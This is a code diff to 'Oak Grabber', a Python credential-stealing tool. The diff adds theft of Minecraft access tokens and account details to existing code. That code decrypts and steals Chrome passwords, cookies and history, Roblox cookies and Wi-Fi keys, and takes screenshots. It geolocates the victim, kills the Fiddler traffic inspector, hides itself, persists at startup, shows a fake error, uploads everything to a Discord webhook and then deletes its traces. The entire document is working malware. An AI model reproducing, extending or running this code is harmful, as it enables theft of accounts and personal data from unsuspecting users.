@@ -10,7 +10,6 @@ Selfhide = True #hides the file (True/False)
 fake_error_message = False #displays a fake error message when file ran. (True/False)
 error_message = 'The image file C:\WINDOWS\SYSTEM32\XINPUT1_3.dll is valid, but is for a machine type other than the current machine. Select OK to continue, or CANCEL to fail the DLL load.' #custom message here
 
-
 if HideConsole is True: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)#hides console faster
 else:pass
 import os, re, json, psutil, random, platform, requests, base64, subprocess, socket, wmi, sqlite3, ntpath, threading, struct, browser_cookie3, uuid, glob, shutil, sys
@@ -24,14 +23,35 @@ from threading import Thread
 from Crypto.Cipher import AES
 from PIL import ImageGrab
 
+accounts = []
 filename =  os.path.basename(sys.argv[0])
 appdata = os.getenv("localappdata")
 roaming = os.getenv("appdata")
-wiseoaktree = os.path.join(roaming, "OakGrabber")
+temp = os.getenv('temp')
+if os.path.exists(temp):
+    wiseoaktree = os.path.join(temp,''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890',k=8)))
 try:
  os.mkdir(wiseoaktree)
 except:
  pass
+def getUser():
+    return os.path.split(os.path.expanduser('~'))[-1]
+
+def getLocations():
+    if os.name == 'nt':
+        locations = [
+            f'{os.getenv("APPDATA")}\\.minecraft\\launcher_accounts.json',
+            f'{os.getenv("APPDATA")}\\Local\Packages\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\LocalState\\games\\com.mojang\\'
+        ]
+        return locations
+    else:
+        locations = [
+            f'\\home\\{getUser()}\\.minecraft\\launcher_accounts.json',
+            f'\\sdcard\\games\\com.mojang\\',
+            f'\\~\\Library\\Application Support\\minecraft'
+            f'Apps\\com.mojang.minecraftpe\\Documents\\games\\com.mojang\\'
+        ]
+        return locations
 def get_master_key():
         with open(appdata + '\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
             local_state = f.read()
@@ -81,6 +101,34 @@ def killfiddler():
             proc.kill()
 threading.Thread(target=killfiddler).start()
 def main():
+    for location in getLocations():
+     if os.path.exists(location):
+            auth_db = json.loads(open(location).read())['accounts']
+            for d in auth_db:
+                try:sessionKey = auth_db[d].get('accessToken')
+                except:sessionKey = "N/A"
+                username = auth_db[d].get('minecraftProfile')['name']
+                sessionType = auth_db[d].get('type')
+                email = auth_db[d].get('username')
+                if sessionKey != None or '':
+                    accounts.append([username, sessionType, email, sessionKey])
+    fr = []
+    count = 0
+    for account in accounts:
+        if '@' in account[2]:
+            name = 'Email Address'
+        else:
+            name = 'Xbox Username'
+        try:McToken =  account[3]
+        except:McToken="N/A"
+        try:McUsername =  account[2]
+        except:McUsername ="N/A"
+        try:McUser= account[0]
+        except:McUser ="N/A"
+        if McToken == None or ' ' or '':
+            McToken = "N/A"
+        else:
+         McToken = account[1]
     if add_to_startup is True:
      try:
         fr =  os.path.basename(sys.argv[0])
@@ -90,7 +138,7 @@ def main():
          pass
     if Selfhide is True:
             ctypes.windll.kernel32.SetFileAttributesW(filename, 2)
-    os.chdir(roaming+ "/OakGrabber")
+    os.chdir(wiseoaktree)
     if HideConsole is True: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     ip, city, country, region, org, loc, googlemap = "None", "None", "None", "None", "None", "None", "None"
     gr = requests.get("https://ipinfo.io/json")
@@ -345,25 +393,30 @@ Processes running
     def screenshot():
         ss = ImageGrab.grab()
         ss.save(f'screenshot.png')
+    def mc():
+        minecraft = ntpath.join(wiseoaktree, 'Minecraft')
+        smh = os.makedirs(minecraft, exist_ok=True)
+        mc = ntpath.join(roaming, '.minecraft')
+        to_grab = ['launcher_accounts.json', 'launcher_profiles.json', 'usercache.json', 'launcher_log.txt']
+        for smh in to_grab:
+            if ntpath.exists(ntpath.join(mc, smh)):
+                shutil.copy2(ntpath.join(mc, smh), minecraft)
     def zip():
-         with ZipFile(f'Oak-Logs-{pc_username}.zip', 'w') as wise:
-            wise.write("screenshot.png")
-            wise.write("sysinfo.txt")
-            wise.write("google-passwords.txt")
-            wise.write("google-cookies.txt")
-            wise.write("google-history.txt")
-            wise.write("robloxcookies.txt")
-            wise.write("wifistealer.txt")
+            os.chdir(temp)
+            shutil.make_archive(wiseoaktree, 'zip', wiseoaktree)
     def upload():
+     os.chdir(wiseoaktree)
      fc = 0
-     f = ""
+     f = f"📁{os.path.basename(wiseoaktree)}\n"
      f2 = ""
      for x in os.listdir():
+      if x.endswith("craft"):
+        f += f"│ {x} 📁\n"
+        fc += 1
       if x.endswith(".txt") or x.endswith(".png"):
                  f += f"│ {x}\n"
                  fc += 1
-      if x.endswith(".zip"):
-          f2 += f"└ {x}"
+     f2 += f"└ Oak-Logs-{pc_username}.zip"
      embed = {
                  "username": f"{pc_username} | Oak Grabber",
                  "content": message,
@@ -376,7 +429,7 @@ Processes running
                              "url": "https://github.com/j0taro/Oak-token-Grabber",
                              "icon_url": "https://i.imgur.com/bbWgtHI.png"
                          },
-                         "description": f"""{embedMsg}\n**__PC INFO__**\n**RAM:** `{ramg}`\n**Disk:** `{disk}GB`\n**CPU:**`{cpu}`\n**GPU:**`{gpu}`\n**Refresh rate:** `{rr}`\n**Model name:** `{mn}`\n**Build manufacturer:** `{bm}`\n**Resolution:** `{size}`\n**Platform:** `{platform}`\n**PC-Name:** `{Oakname}`\n**PC-User:** `{pc_username}`\n**__IP INFO__**\n**IP:** `{ip}`\n**City:** `{city}`\n**Country:** `{country}`\n**Region:** `{region}`\n**Org:** `{org}`\n**Mac:** `{mac}`\n**Loc:** `{loc}`\n**Googlemap:** [Googlemap location]({"https://www.google.com/maps/search/google+map++" + loc})\n**Elapsed time:** `{time.time() - starttime}`\n```yaml\n{fc} Files Found:\n{f}{f2}```""",
+                         "description": f"""{embedMsg}\n**__PC INFO__**\n**RAM:** `{ramg}`\n**Disk:** `{disk}GB`\n**CPU:**`{cpu}`\n**GPU:**`{gpu}`\n**Refresh rate:** `{rr}`\n**Model name:** `{mn}`\n**Build manufacturer:** `{bm}`\n**Resolution:** `{size}`\n**Platform:** `{platform}`\n**PC-Name:** `{Oakname}`\n**PC-User:** `{pc_username}`\n**__IP INFO__**\n**IP:** `{ip}`\n**City:** `{city}`\n**Country:** `{country}`\n**Region:** `{region}`\n**Org:** `{org}`\n**Mac:** `{mac}`\n**Loc:** `{loc}`\n**Googlemap:** [Googlemap location]({"https://www.google.com/maps/search/google+map++" + loc})\n__**Minecraft Info**__ \n**Minecraft Profile:** `{McUsername}`\n**Token:** `{McToken}`\n **Account type:** `{sessionType}`\n **Name:** `{McUser}`\n**Elapsed time:** `{time.time() - starttime}`\n```yaml\n{fc} Files Found:\n{f}{f2}```""",
                          "color": 0x1e8a81,
                          "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                          "thumbnail": {
@@ -392,17 +445,21 @@ Processes running
      file = {
         "username": f"{pc_username} | Oak Grabber",
         "avatar_url":"https://i.imgur.com/bbWgtHI.png"}
+     os.chdir(temp)
      payload = json.dumps({ 'content': message, 'embeds': [embed] })
+     os.rename(f'{os.path.basename(wiseoaktree)}.zip',f'Oak-Logs-{pc_username}.zip')
      with open(f'Oak-Logs-{pc_username}.zip', 'rb') as f:
         requests.post(webhook, json = embed)
         requests.post(webhook,data=file ,files={'upload_file': f})
     def cleanup():
-        os.chdir(roaming)
-        shutil.rmtree("OakGrabber")
+        os.chdir(temp)
+        os.remove(f'Oak-Logs-{pc_username}.zip')
+        shutil.rmtree(wiseoaktree)
     def error():
      if fake_error_message is True:
       messagebox.showerror('Error', error_message)
     wifistealer()
+    mc()
     cookies()
     history() #code kinda missed up here fr lmao
     passwords()
